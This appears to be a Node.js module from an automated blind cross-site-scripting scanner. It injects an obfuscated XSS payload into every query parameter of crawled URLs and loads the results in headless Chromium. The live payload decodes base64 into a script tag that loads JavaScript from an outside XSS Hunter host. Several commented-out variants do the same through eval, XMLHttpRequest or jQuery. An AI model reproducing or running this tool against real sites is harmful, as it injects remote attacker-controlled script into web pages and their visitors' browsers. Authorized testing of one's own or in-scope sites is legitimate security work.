var cons = require('../constants.js')
var util = require('../utils.js')

var path = require('path')

var blacklistExt = ["js","css","png","jpg","svg","gif","ico","txt"]

var exploits = [
  //encodeURIComponent("javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onload=/*<svg/*/onload=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbmFkaW5vLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;//>"),

  encodeURIComponent('\'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbmFkaW5vLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>'),
/*
  encodeURIComponent('\'"><script src='+cons.xssHunter+'></script>'),
  encodeURIComponent("javascript:eval('var a=document.createElement(\'script\');a.src=\'"+cons.xssHunter+"\';document.body.appendChild(a)')"),
  encodeURIComponent('"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbmFkaW5vLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>'),
  encodeURIComponent('<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "'+cons.xssHunter+'");a.send();</script>'),
  encodeURIComponent('<script>$.getScript("'+cons.xssHunter+'")</script>')
  */
]

async function fakebrowser(urls){
  return new Promise((resolve, reject) => {
      var spawnHeadlessChromium = require('run-headless-chromium').spawn;

      util.debug("XSS test for "+urls.length)

      var proc = spawnHeadlessChromium(urls, {
          stdio: 'inherit',
      });
      proc.on('close', function() {
          clearTimeout(delayedExit);
          console.log('Headless Chromium exited!');
          resolve()
      });
      var delayedExit = setTimeout(function() {
          console.log('Chrome did not exit within a few seconds, sending SIGINT...');
          // Graceful exit - allow run-headless-chromium to exit Chrome and Xvfb.
          proc.kill('SIGINT');
          resolve()
          // If you do proc.kill(); then Chrome and Xvfb may still hang around.
      }, 10*1000);
  })
}

module.exports.test = async function(urls){

  var payloads = []

  for(let item of urls.keys()) {
    if(blacklistExt.includes(path.extname(item.pathname).substring(1))){
      continue
    }

    //payloads.push(item.href.split("#")[0]+"#"+exploits[0])
    //payloads.push(item.protocol+"//"+item.host+item.pathname+exploits[0])

    if(item.search){
      if(!item.search.substring(1)) { continue }

      var arrayParams = item.search.substring(1).split("&")
      var basepath = item.protocol+"//"+item.host+item.pathname+"?"

      for(var i = 0; i < arrayParams.length; i++){
        var param = arrayParams[i]
        var key = param.split("=")[0]

        basepath += key + "=" + exploits[0]+"&"
      }

      payloads.push(basepath)
    }
  }

  await new Promise(resolve => setTimeout(resolve, 1000));
  util.debug("Payloads to be done "+payloads.length)

  var beginning = 0
  var offset = 100

  if(payloads.length > offset){

    while(beginning < payloads.length){
      util.debug("Analyzing first "+(beginning+offset)+" out of "+payloads.length)
      await fakebrowser(payloads.slice(beginning, Math.min(payloads.length, beginning+offset)))
      beginning += offset
    }
  } else if(payloads.length > 0) {
    await fakebrowser(payloads)
  }

  util.debug("Bye bye")

  return new Promise(function(resolve, reject){
    resolve("Done!")
  })
}
